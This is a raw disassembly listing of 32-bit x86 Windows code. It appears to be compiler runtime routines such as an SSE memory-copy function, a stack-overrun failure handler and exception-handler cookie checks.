  401e22:	a3 dc 9a 41 00       	mov    %eax,0x419adc
  401e27:	8b 45 04             	mov    0x4(%ebp),%eax
  401e2a:	a3 e0 9a 41 00       	mov    %eax,0x419ae0
  401e2f:	8d 45 08             	lea    0x8(%ebp),%eax
  401e32:	a3 ec 9a 41 00       	mov    %eax,0x419aec
  401e37:	8b 85 dc fc ff ff    	mov    -0x324(%ebp),%eax
  401e3d:	c7 05 28 9a 41 00 01 	movl   $0x10001,0x419a28
  401e44:	00 01 00 
  401e47:	a1 e0 9a 41 00       	mov    0x419ae0,%eax
  401e4c:	a3 e4 99 41 00       	mov    %eax,0x4199e4
  401e51:	c7 05 d8 99 41 00 09 	movl   $0xc0000409,0x4199d8
  401e58:	04 00 c0 
  401e5b:	c7 05 dc 99 41 00 01 	movl   $0x1,0x4199dc
  401e62:	00 00 00 
  401e65:	c7 05 e8 99 41 00 01 	movl   $0x1,0x4199e8
  401e6c:	00 00 00 
  401e6f:	6a 04                	push   $0x4
  401e71:	58                   	pop    %eax
  401e72:	6b c0 00             	imul   $0x0,%eax,%eax
  401e75:	c7 80 ec 99 41 00 02 	movl   $0x2,0x4199ec(%eax)
  401e7c:	00 00 00 
  401e7f:	6a 04                	push   $0x4
  401e81:	58                   	pop    %eax
  401e82:	6b c0 00             	imul   $0x0,%eax,%eax
  401e85:	8b 0d 40 90 41 00    	mov    0x419040,%ecx
  401e8b:	89 4c 05 f8          	mov    %ecx,-0x8(%ebp,%eax,1)
  401e8f:	6a 04                	push   $0x4
  401e91:	58                   	pop    %eax
  401e92:	c1 e0 00             	shl    $0x0,%eax
  401e95:	8b 0d 80 90 41 00    	mov    0x419080,%ecx
  401e9b:	89 4c 05 f8          	mov    %ecx,-0x8(%ebp,%eax,1)
  401e9f:	68 c8 21 41 00       	push   $0x4121c8
  401ea4:	e8 e0 fe ff ff       	call   0x401d89
  401ea9:	90                   	nop
  401eaa:	c9                   	leave
  401eab:	c3                   	ret
  401eac:	cc                   	int3
  401ead:	cc                   	int3
  401eae:	cc                   	int3
  401eaf:	cc                   	int3
  401eb0:	57                   	push   %edi
  401eb1:	56                   	push   %esi
  401eb2:	8b 74 24 10          	mov    0x10(%esp),%esi
  401eb6:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  401eba:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  401ebe:	8b c1                	mov    %ecx,%eax
  401ec0:	8b d1                	mov    %ecx,%edx
  401ec2:	03 c6                	add    %esi,%eax
  401ec4:	3b fe                	cmp    %esi,%edi
  401ec6:	76 08                	jbe    0x401ed0
  401ec8:	3b f8                	cmp    %eax,%edi
  401eca:	0f 82 94 02 00 00    	jb     0x402164
  401ed0:	83 f9 20             	cmp    $0x20,%ecx
  401ed3:	0f 82 d2 04 00 00    	jb     0x4023ab
  401ed9:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  401edf:	73 13                	jae    0x401ef4
  401ee1:	0f ba 25 18 90 41 00 	btl    $0x1,0x419018
  401ee8:	01 
  401ee9:	0f 82 8e 04 00 00    	jb     0x40237d
  401eef:	e9 e3 01 00 00       	jmp    0x4020d7
  401ef4:	0f ba 25 d4 99 41 00 	btl    $0x1,0x4199d4
  401efb:	01 
  401efc:	73 09                	jae    0x401f07
  401efe:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401f00:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401f04:	5e                   	pop    %esi
  401f05:	5f                   	pop    %edi
  401f06:	c3                   	ret
  401f07:	8b c7                	mov    %edi,%eax
  401f09:	33 c6                	xor    %esi,%eax
  401f0b:	a9 0f 00 00 00       	test   $0xf,%eax
  401f10:	75 0e                	jne    0x401f20
  401f12:	0f ba 25 18 90 41 00 	btl    $0x1,0x419018
  401f19:	01 
  401f1a:	0f 82 e0 03 00 00    	jb     0x402300
  401f20:	0f ba 25 d4 99 41 00 	btl    $0x0,0x4199d4
  401f27:	00 
  401f28:	0f 83 a9 01 00 00    	jae    0x4020d7
  401f2e:	f7 c7 03 00 00 00    	test   $0x3,%edi
  401f34:	0f 85 9d 01 00 00    	jne    0x4020d7
  401f3a:	f7 c6 03 00 00 00    	test   $0x3,%esi
  401f40:	0f 85 ac 01 00 00    	jne    0x4020f2
  401f46:	0f ba e7 02          	bt     $0x2,%edi
  401f4a:	73 0d                	jae    0x401f59
  401f4c:	8b 06                	mov    (%esi),%eax
  401f4e:	83 e9 04             	sub    $0x4,%ecx
  401f51:	8d 76 04             	lea    0x4(%esi),%esi
  401f54:	89 07                	mov    %eax,(%edi)
  401f56:	8d 7f 04             	lea    0x4(%edi),%edi
  401f59:	0f ba e7 03          	bt     $0x3,%edi
  401f5d:	73 11                	jae    0x401f70
  401f5f:	f3 0f 7e 0e          	movq   (%esi),%xmm1
  401f63:	83 e9 08             	sub    $0x8,%ecx
  401f66:	8d 76 08             	lea    0x8(%esi),%esi
  401f69:	66 0f d6 0f          	movq   %xmm1,(%edi)
  401f6d:	8d 7f 08             	lea    0x8(%edi),%edi
  401f70:	f7 c6 07 00 00 00    	test   $0x7,%esi
  401f76:	74 65                	je     0x401fdd
  401f78:	0f ba e6 03          	bt     $0x3,%esi
  401f7c:	0f 83 b4 00 00 00    	jae    0x402036
  401f82:	66 0f 6f 4e f4       	movdqa -0xc(%esi),%xmm1
  401f87:	8d 76 f4             	lea    -0xc(%esi),%esi
  401f8a:	8b ff                	mov    %edi,%edi
  401f8c:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
  401f91:	83 e9 30             	sub    $0x30,%ecx
  401f94:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
  401f99:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
  401f9e:	8d 76 30             	lea    0x30(%esi),%esi
  401fa1:	83 f9 30             	cmp    $0x30,%ecx
  401fa4:	66 0f 6f d3          	movdqa %xmm3,%xmm2
  401fa8:	66 0f 3a 0f d9 0c    	palignr $0xc,%xmm1,%xmm3
  401fae:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
  401fb2:	66 0f 6f e0          	movdqa %xmm0,%xmm4
  401fb6:	66 0f 3a 0f c2 0c    	palignr $0xc,%xmm2,%xmm0
  401fbc:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  401fc1:	66 0f 6f cd          	movdqa %xmm5,%xmm1
  401fc5:	66 0f 3a 0f ec 0c    	palignr $0xc,%xmm4,%xmm5
  401fcb:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
  401fd0:	8d 7f 30             	lea    0x30(%edi),%edi
  401fd3:	73 b7                	jae    0x401f8c
  401fd5:	8d 76 0c             	lea    0xc(%esi),%esi
  401fd8:	e9 af 00 00 00       	jmp    0x40208c
  401fdd:	66 0f 6f 4e f8       	movdqa -0x8(%esi),%xmm1
  401fe2:	8d 76 f8             	lea    -0x8(%esi),%esi
  401fe5:	8d 49 00             	lea    0x0(%ecx),%ecx
  401fe8:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
  401fed:	83 e9 30             	sub    $0x30,%ecx
  401ff0:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
  401ff5:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
  401ffa:	8d 76 30             	lea    0x30(%esi),%esi
  401ffd:	83 f9 30             	cmp    $0x30,%ecx
  402000:	66 0f 6f d3          	movdqa %xmm3,%xmm2
  402004:	66 0f 3a 0f d9 08    	palignr $0x8,%xmm1,%xmm3
  40200a:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
  40200e:	66 0f 6f e0          	movdqa %xmm0,%xmm4
  402012:	66 0f 3a 0f c2 08    	palignr $0x8,%xmm2,%xmm0
  402018:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  40201d:	66 0f 6f cd          	movdqa %xmm5,%xmm1
  402021:	66 0f 3a 0f ec 08    	palignr $0x8,%xmm4,%xmm5
  402027:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
  40202c:	8d 7f 30             	lea    0x30(%edi),%edi
  40202f:	73 b7                	jae    0x401fe8
  402031:	8d 76 08             	lea    0x8(%esi),%esi
  402034:	eb 56                	jmp    0x40208c
  402036:	66 0f 6f 4e fc       	movdqa -0x4(%esi),%xmm1
  40203b:	8d 76 fc             	lea    -0x4(%esi),%esi
  40203e:	8b ff                	mov    %edi,%edi
  402040:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
  402045:	83 e9 30             	sub    $0x30,%ecx
  402048:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
  40204d:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
  402052:	8d 76 30             	lea    0x30(%esi),%esi
  402055:	83 f9 30             	cmp    $0x30,%ecx
  402058:	66 0f 6f d3          	movdqa %xmm3,%xmm2
  40205c:	66 0f 3a 0f d9 04    	palignr $0x4,%xmm1,%xmm3
  402062:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
  402066:	66 0f 6f e0          	movdqa %xmm0,%xmm4
  40206a:	66 0f 3a 0f c2 04    	palignr $0x4,%xmm2,%xmm0
  402070:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  402075:	66 0f 6f cd          	movdqa %xmm5,%xmm1
  402079:	66 0f 3a 0f ec 04    	palignr $0x4,%xmm4,%xmm5
  40207f:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
  402084:	8d 7f 30             	lea    0x30(%edi),%edi
  402087:	73 b7                	jae    0x402040
  402089:	8d 76 04             	lea    0x4(%esi),%esi
  40208c:	83 f9 10             	cmp    $0x10,%ecx
  40208f:	72 13                	jb     0x4020a4
  402091:	f3 0f 6f 0e          	movdqu (%esi),%xmm1
  402095:	83 e9 10             	sub    $0x10,%ecx
  402098:	8d 76 10             	lea    0x10(%esi),%esi
  40209b:	66 0f 7f 0f          	movdqa %xmm1,(%edi)
  40209f:	8d 7f 10             	lea    0x10(%edi),%edi
  4020a2:	eb e8                	jmp    0x40208c
  4020a4:	0f ba e1 02          	bt     $0x2,%ecx
  4020a8:	73 0d                	jae    0x4020b7
  4020aa:	8b 06                	mov    (%esi),%eax
  4020ac:	83 e9 04             	sub    $0x4,%ecx
  4020af:	8d 76 04             	lea    0x4(%esi),%esi
  4020b2:	89 07                	mov    %eax,(%edi)
  4020b4:	8d 7f 04             	lea    0x4(%edi),%edi
  4020b7:	0f ba e1 03          	bt     $0x3,%ecx
  4020bb:	73 11                	jae    0x4020ce
  4020bd:	f3 0f 7e 0e          	movq   (%esi),%xmm1
  4020c1:	83 e9 08             	sub    $0x8,%ecx
  4020c4:	8d 76 08             	lea    0x8(%esi),%esi
  4020c7:	66 0f d6 0f          	movq   %xmm1,(%edi)
  4020cb:	8d 7f 08             	lea    0x8(%edi),%edi
  4020ce:	8b 04 8d 14 21 40 00 	mov    0x402114(,%ecx,4),%eax
  4020d5:	ff e0                	jmp    *%eax
  4020d7:	f7 c7 03 00 00 00    	test   $0x3,%edi
  4020dd:	74 13                	je     0x4020f2
  4020df:	8a 06                	mov    (%esi),%al
  4020e1:	88 07                	mov    %al,(%edi)
  4020e3:	49                   	dec    %ecx
  4020e4:	83 c6 01             	add    $0x1,%esi
  4020e7:	83 c7 01             	add    $0x1,%edi
  4020ea:	f7 c7 03 00 00 00    	test   $0x3,%edi
  4020f0:	75 ed                	jne    0x4020df
  4020f2:	8b d1                	mov    %ecx,%edx
  4020f4:	83 f9 20             	cmp    $0x20,%ecx
  4020f7:	0f 82 ae 02 00 00    	jb     0x4023ab
  4020fd:	c1 e9 02             	shr    $0x2,%ecx
  402100:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402102:	83 e2 03             	and    $0x3,%edx
  402105:	ff 24 95 14 21 40 00 	jmp    *0x402114(,%edx,4)
  40210c:	ff 24 8d 24 21 40 00 	jmp    *0x402124(,%ecx,4)
  402113:	90                   	nop
  402114:	24 21                	and    $0x21,%al
  402116:	40                   	inc    %eax
  402117:	00 2c 21             	add    %ch,(%ecx,%eiz,1)
  40211a:	40                   	inc    %eax
  40211b:	00 38                	add    %bh,(%eax)
  40211d:	21 40 00             	and    %eax,0x0(%eax)
  402120:	4c                   	dec    %esp
  402121:	21 40 00             	and    %eax,0x0(%eax)
  402124:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402128:	5e                   	pop    %esi
  402129:	5f                   	pop    %edi
  40212a:	c3                   	ret
  40212b:	90                   	nop
  40212c:	8a 06                	mov    (%esi),%al
  40212e:	88 07                	mov    %al,(%edi)
  402130:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402134:	5e                   	pop    %esi
  402135:	5f                   	pop    %edi
  402136:	c3                   	ret
  402137:	90                   	nop
  402138:	8a 06                	mov    (%esi),%al
  40213a:	88 07                	mov    %al,(%edi)
  40213c:	8a 46 01             	mov    0x1(%esi),%al
  40213f:	88 47 01             	mov    %al,0x1(%edi)
  402142:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402146:	5e                   	pop    %esi
  402147:	5f                   	pop    %edi
  402148:	c3                   	ret
  402149:	8d 49 00             	lea    0x0(%ecx),%ecx
  40214c:	8a 06                	mov    (%esi),%al
  40214e:	88 07                	mov    %al,(%edi)
  402150:	8a 46 01             	mov    0x1(%esi),%al
  402153:	88 47 01             	mov    %al,0x1(%edi)
  402156:	8a 46 02             	mov    0x2(%esi),%al
  402159:	88 47 02             	mov    %al,0x2(%edi)
  40215c:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402160:	5e                   	pop    %esi
  402161:	5f                   	pop    %edi
  402162:	c3                   	ret
  402163:	90                   	nop
  402164:	8d 34 0e             	lea    (%esi,%ecx,1),%esi
  402167:	8d 3c 0f             	lea    (%edi,%ecx,1),%edi
  40216a:	83 f9 20             	cmp    $0x20,%ecx
  40216d:	0f 82 51 01 00 00    	jb     0x4022c4
  402173:	0f ba 25 18 90 41 00 	btl    $0x1,0x419018
  40217a:	01 
  40217b:	0f 82 94 00 00 00    	jb     0x402215
  402181:	f7 c7 03 00 00 00    	test   $0x3,%edi
  402187:	74 14                	je     0x40219d
  402189:	8b d7                	mov    %edi,%edx
  40218b:	83 e2 03             	and    $0x3,%edx
  40218e:	2b ca                	sub    %edx,%ecx
  402190:	8a 46 ff             	mov    -0x1(%esi),%al
  402193:	88 47 ff             	mov    %al,-0x1(%edi)
  402196:	4e                   	dec    %esi
  402197:	4f                   	dec    %edi
  402198:	83 ea 01             	sub    $0x1,%edx
  40219b:	75 f3                	jne    0x402190
  40219d:	83 f9 20             	cmp    $0x20,%ecx
  4021a0:	0f 82 1e 01 00 00    	jb     0x4022c4
  4021a6:	8b d1                	mov    %ecx,%edx
  4021a8:	c1 e9 02             	shr    $0x2,%ecx
  4021ab:	83 e2 03             	and    $0x3,%edx
  4021ae:	83 ee 04             	sub    $0x4,%esi
  4021b1:	83 ef 04             	sub    $0x4,%edi
  4021b4:	fd                   	std
  4021b5:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4021b7:	fc                   	cld
  4021b8:	ff 24 95 c0 21 40 00 	jmp    *0x4021c0(,%edx,4)
  4021bf:	90                   	nop
  4021c0:	d0 21                	shlb   $1,(%ecx)
  4021c2:	40                   	inc    %eax
  4021c3:	00 d8                	add    %bl,%al
  4021c5:	21 40 00             	and    %eax,0x0(%eax)
  4021c8:	e8 21 40 00 fc       	call   0xfc4061ee
  4021cd:	21 40 00             	and    %eax,0x0(%eax)
  4021d0:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4021d4:	5e                   	pop    %esi
  4021d5:	5f                   	pop    %edi
  4021d6:	c3                   	ret
  4021d7:	90                   	nop
  4021d8:	8a 46 03             	mov    0x3(%esi),%al
  4021db:	88 47 03             	mov    %al,0x3(%edi)
  4021de:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4021e2:	5e                   	pop    %esi
  4021e3:	5f                   	pop    %edi
  4021e4:	c3                   	ret
  4021e5:	8d 49 00             	lea    0x0(%ecx),%ecx
  4021e8:	8a 46 03             	mov    0x3(%esi),%al
  4021eb:	88 47 03             	mov    %al,0x3(%edi)
  4021ee:	8a 46 02             	mov    0x2(%esi),%al
  4021f1:	88 47 02             	mov    %al,0x2(%edi)
  4021f4:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4021f8:	5e                   	pop    %esi
  4021f9:	5f                   	pop    %edi
  4021fa:	c3                   	ret
  4021fb:	90                   	nop
  4021fc:	8a 46 03             	mov    0x3(%esi),%al
  4021ff:	88 47 03             	mov    %al,0x3(%edi)
  402202:	8a 46 02             	mov    0x2(%esi),%al
  402205:	88 47 02             	mov    %al,0x2(%edi)
  402208:	8a 46 01             	mov    0x1(%esi),%al
  40220b:	88 47 01             	mov    %al,0x1(%edi)
  40220e:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402212:	5e                   	pop    %esi
  402213:	5f                   	pop    %edi
  402214:	c3                   	ret
  402215:	f7 c7 0f 00 00 00    	test   $0xf,%edi
  40221b:	74 0f                	je     0x40222c
  40221d:	49                   	dec    %ecx
  40221e:	4e                   	dec    %esi
  40221f:	4f                   	dec    %edi
  402220:	8a 06                	mov    (%esi),%al
  402222:	88 07                	mov    %al,(%edi)
  402224:	f7 c7 0f 00 00 00    	test   $0xf,%edi
  40222a:	75 f1                	jne    0x40221d
  40222c:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  402232:	72 68                	jb     0x40229c
  402234:	81 ee 80 00 00 00    	sub    $0x80,%esi
  40223a:	81 ef 80 00 00 00    	sub    $0x80,%edi
  402240:	f3 0f 6f 06          	movdqu (%esi),%xmm0
  402244:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
  402249:	f3 0f 6f 56 20       	movdqu 0x20(%esi),%xmm2
  40224e:	f3 0f 6f 5e 30       	movdqu 0x30(%esi),%xmm3
  402253:	f3 0f 6f 66 40       	movdqu 0x40(%esi),%xmm4
  402258:	f3 0f 6f 6e 50       	movdqu 0x50(%esi),%xmm5
  40225d:	f3 0f 6f 76 60       	movdqu 0x60(%esi),%xmm6
  402262:	f3 0f 6f 7e 70       	movdqu 0x70(%esi),%xmm7
  402267:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  40226b:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
  402270:	f3 0f 7f 57 20       	movdqu %xmm2,0x20(%edi)
  402275:	f3 0f 7f 5f 30       	movdqu %xmm3,0x30(%edi)
  40227a:	f3 0f 7f 67 40       	movdqu %xmm4,0x40(%edi)
  40227f:	f3 0f 7f 6f 50       	movdqu %xmm5,0x50(%edi)
  402284:	f3 0f 7f 77 60       	movdqu %xmm6,0x60(%edi)
  402289:	f3 0f 7f 7f 70       	movdqu %xmm7,0x70(%edi)
  40228e:	81 e9 80 00 00 00    	sub    $0x80,%ecx
  402294:	f7 c1 80 ff ff ff    	test   $0xffffff80,%ecx
  40229a:	75 90                	jne    0x40222c
  40229c:	83 f9 20             	cmp    $0x20,%ecx
  40229f:	72 23                	jb     0x4022c4
  4022a1:	83 ee 20             	sub    $0x20,%esi
  4022a4:	83 ef 20             	sub    $0x20,%edi
  4022a7:	f3 0f 6f 06          	movdqu (%esi),%xmm0
  4022ab:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
  4022b0:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  4022b4:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
  4022b9:	83 e9 20             	sub    $0x20,%ecx
  4022bc:	f7 c1 e0 ff ff ff    	test   $0xffffffe0,%ecx
  4022c2:	75 dd                	jne    0x4022a1
  4022c4:	f7 c1 fc ff ff ff    	test   $0xfffffffc,%ecx
  4022ca:	74 15                	je     0x4022e1
  4022cc:	83 ef 04             	sub    $0x4,%edi
  4022cf:	83 ee 04             	sub    $0x4,%esi
  4022d2:	8b 06                	mov    (%esi),%eax
  4022d4:	89 07                	mov    %eax,(%edi)
  4022d6:	83 e9 04             	sub    $0x4,%ecx
  4022d9:	f7 c1 fc ff ff ff    	test   $0xfffffffc,%ecx
  4022df:	75 eb                	jne    0x4022cc
  4022e1:	85 c9                	test   %ecx,%ecx
  4022e3:	74 0f                	je     0x4022f4
  4022e5:	83 ef 01             	sub    $0x1,%edi
  4022e8:	83 ee 01             	sub    $0x1,%esi
  4022eb:	8a 06                	mov    (%esi),%al
  4022ed:	88 07                	mov    %al,(%edi)
  4022ef:	83 e9 01             	sub    $0x1,%ecx
  4022f2:	75 f1                	jne    0x4022e5
  4022f4:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4022f8:	5e                   	pop    %esi
  4022f9:	5f                   	pop    %edi
  4022fa:	c3                   	ret
  4022fb:	eb 03                	jmp    0x402300
  4022fd:	cc                   	int3
  4022fe:	cc                   	int3
  4022ff:	cc                   	int3
  402300:	8b c6                	mov    %esi,%eax
  402302:	83 e0 0f             	and    $0xf,%eax
  402305:	85 c0                	test   %eax,%eax
  402307:	0f 85 e3 00 00 00    	jne    0x4023f0
  40230d:	8b d1                	mov    %ecx,%edx
  40230f:	83 e1 7f             	and    $0x7f,%ecx
  402312:	c1 ea 07             	shr    $0x7,%edx
  402315:	74 66                	je     0x40237d
  402317:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40231e:	8b ff                	mov    %edi,%edi
  402320:	66 0f 6f 06          	movdqa (%esi),%xmm0
  402324:	66 0f 6f 4e 10       	movdqa 0x10(%esi),%xmm1
  402329:	66 0f 6f 56 20       	movdqa 0x20(%esi),%xmm2
  40232e:	66 0f 6f 5e 30       	movdqa 0x30(%esi),%xmm3
  402333:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  402337:	66 0f 7f 4f 10       	movdqa %xmm1,0x10(%edi)
  40233c:	66 0f 7f 57 20       	movdqa %xmm2,0x20(%edi)
  402341:	66 0f 7f 5f 30       	movdqa %xmm3,0x30(%edi)
  402346:	66 0f 6f 66 40       	movdqa 0x40(%esi),%xmm4
  40234b:	66 0f 6f 6e 50       	movdqa 0x50(%esi),%xmm5
  402350:	66 0f 6f 76 60       	movdqa 0x60(%esi),%xmm6
  402355:	66 0f 6f 7e 70       	movdqa 0x70(%esi),%xmm7
  40235a:	66 0f 7f 67 40       	movdqa %xmm4,0x40(%edi)
  40235f:	66 0f 7f 6f 50       	movdqa %xmm5,0x50(%edi)
  402364:	66 0f 7f 77 60       	movdqa %xmm6,0x60(%edi)
  402369:	66 0f 7f 7f 70       	movdqa %xmm7,0x70(%edi)
  40236e:	8d b6 80 00 00 00    	lea    0x80(%esi),%esi
  402374:	8d bf 80 00 00 00    	lea    0x80(%edi),%edi
  40237a:	4a                   	dec    %edx
  40237b:	75 a3                	jne    0x402320
  40237d:	85 c9                	test   %ecx,%ecx
  40237f:	74 5f                	je     0x4023e0
  402381:	8b d1                	mov    %ecx,%edx
  402383:	c1 ea 05             	shr    $0x5,%edx
  402386:	85 d2                	test   %edx,%edx
  402388:	74 21                	je     0x4023ab
  40238a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  402390:	f3 0f 6f 06          	movdqu (%esi),%xmm0
  402394:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
  402399:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  40239d:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
  4023a2:	8d 76 20             	lea    0x20(%esi),%esi
  4023a5:	8d 7f 20             	lea    0x20(%edi),%edi
  4023a8:	4a                   	dec    %edx
  4023a9:	75 e5                	jne    0x402390
  4023ab:	83 e1 1f             	and    $0x1f,%ecx
  4023ae:	74 30                	je     0x4023e0
  4023b0:	8b c1                	mov    %ecx,%eax
  4023b2:	c1 e9 02             	shr    $0x2,%ecx
  4023b5:	74 0f                	je     0x4023c6
  4023b7:	8b 16                	mov    (%esi),%edx
  4023b9:	89 17                	mov    %edx,(%edi)
  4023bb:	83 c7 04             	add    $0x4,%edi
  4023be:	83 c6 04             	add    $0x4,%esi
  4023c1:	83 e9 01             	sub    $0x1,%ecx
  4023c4:	75 f1                	jne    0x4023b7
  4023c6:	8b c8                	mov    %eax,%ecx
  4023c8:	83 e1 03             	and    $0x3,%ecx
  4023cb:	74 13                	je     0x4023e0
  4023cd:	8a 06                	mov    (%esi),%al
  4023cf:	88 07                	mov    %al,(%edi)
  4023d1:	46                   	inc    %esi
  4023d2:	47                   	inc    %edi
  4023d3:	49                   	dec    %ecx
  4023d4:	75 f7                	jne    0x4023cd
  4023d6:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4023dd:	8d 49 00             	lea    0x0(%ecx),%ecx
  4023e0:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4023e4:	5e                   	pop    %esi
  4023e5:	5f                   	pop    %edi
  4023e6:	c3                   	ret
  4023e7:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4023ee:	8b ff                	mov    %edi,%edi
  4023f0:	ba 10 00 00 00       	mov    $0x10,%edx
  4023f5:	2b d0                	sub    %eax,%edx
  4023f7:	2b ca                	sub    %edx,%ecx
  4023f9:	51                   	push   %ecx
  4023fa:	8b c2                	mov    %edx,%eax
  4023fc:	8b c8                	mov    %eax,%ecx
  4023fe:	83 e1 03             	and    $0x3,%ecx
  402401:	74 09                	je     0x40240c
  402403:	8a 16                	mov    (%esi),%dl
  402405:	88 17                	mov    %dl,(%edi)
  402407:	46                   	inc    %esi
  402408:	47                   	inc    %edi
  402409:	49                   	dec    %ecx
  40240a:	75 f7                	jne    0x402403
  40240c:	c1 e8 02             	shr    $0x2,%eax
  40240f:	74 0d                	je     0x40241e
  402411:	8b 16                	mov    (%esi),%edx
  402413:	89 17                	mov    %edx,(%edi)
  402415:	8d 76 04             	lea    0x4(%esi),%esi
  402418:	8d 7f 04             	lea    0x4(%edi),%edi
  40241b:	48                   	dec    %eax
  40241c:	75 f3                	jne    0x402411
  40241e:	59                   	pop    %ecx
  40241f:	e9 e9 fe ff ff       	jmp    0x40230d
  402424:	cc                   	int3
  402425:	cc                   	int3
  402426:	cc                   	int3
  402427:	cc                   	int3
  402428:	cc                   	int3
  402429:	cc                   	int3
  40242a:	cc                   	int3
  40242b:	cc                   	int3
  40242c:	cc                   	int3
  40242d:	cc                   	int3
  40242e:	cc                   	int3
  40242f:	cc                   	int3
  402430:	55                   	push   %ebp
  402431:	8b ec                	mov    %esp,%ebp
  402433:	56                   	push   %esi
  402434:	8b 75 08             	mov    0x8(%ebp),%esi
  402437:	57                   	push   %edi
  402438:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40243b:	8b 06                	mov    (%esi),%eax
  40243d:	83 f8 fe             	cmp    $0xfffffffe,%eax
  402440:	74 0d                	je     0x40244f
  402442:	8b 4e 04             	mov    0x4(%esi),%ecx
  402445:	03 cf                	add    %edi,%ecx
  402447:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  40244a:	e8 2c f9 ff ff       	call   0x401d7b
  40244f:	8b 46 08             	mov    0x8(%esi),%eax
  402452:	8b 4e 0c             	mov    0xc(%esi),%ecx
  402455:	03 cf                	add    %edi,%ecx
  402457:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  40245a:	5f                   	pop    %edi
  40245b:	5e                   	pop    %esi
  40245c:	5d                   	pop    %ebp
  40245d:	e9 19 f9 ff ff       	jmp    0x401d7b
  402462:	cc                   	int3
  402463:	cc                   	int3
  402464:	cc                   	int3
  402465:	cc                   	int3
  402466:	cc                   	int3
  402467:	cc                   	int3
  402468:	cc                   	int3
  402469:	cc                   	int3
  40246a:	cc                   	int3
  40246b:	cc                   	int3
  40246c:	cc                   	int3
  40246d:	cc                   	int3
  40246e:	cc                   	int3
  40246f:	cc                   	int3
  402470:	55                   	push   %ebp
  402471:	8b ec                	mov    %esp,%ebp
  402473:	83 ec 1c             	sub    $0x1c,%esp
  402476:	53                   	push   %ebx
  402477:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40247a:	56                   	push   %esi
  40247b:	57                   	push   %edi
  40247c:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  402480:	ff 33                	push   (%ebx)
  402482:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  402489:	e8 72 eb 00 00       	call   0x411000
  40248e:	89 03                	mov    %eax,(%ebx)
  402490:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  402493:	8b 43 08             	mov    0x8(%ebx),%eax
  402496:	8d 73 10             	lea    0x10(%ebx),%esi
  402499:	33 05 40 90 41 00    	xor    0x419040,%eax
  40249f:	56                   	push   %esi
  4024a0:	50                   	push   %eax
  4024a1:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4024a4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4024a7:	e8 84 ff ff ff       	call   0x402430
  4024ac:	ff 75 10             	push   0x10(%ebp)
  4024af:	e8 23 06 00 00       	call   0x402ad7
  4024b4:	8b 45 08             	mov    0x8(%ebp),%eax
  4024b7:	83 c4 10             	add    $0x10,%esp
  4024ba:	8b 7b 0c             	mov    0xc(%ebx),%edi
  4024bd:	f6 40 04 66          	testb  $0x66,0x4(%eax)
  4024c1:	75 5a                	jne    0x40251d
  4024c3:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4024c6:	8b 45 10             	mov    0x10(%ebp),%eax
  4024c9:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4024cc:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4024cf:	89 43 fc             	mov    %eax,-0x4(%ebx)
  4024d2:	83 ff fe             	cmp    $0xfffffffe,%edi
  4024d5:	74 69                	je     0x402540
  4024d7:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4024da:	8d 47 02             	lea    0x2(%edi),%eax
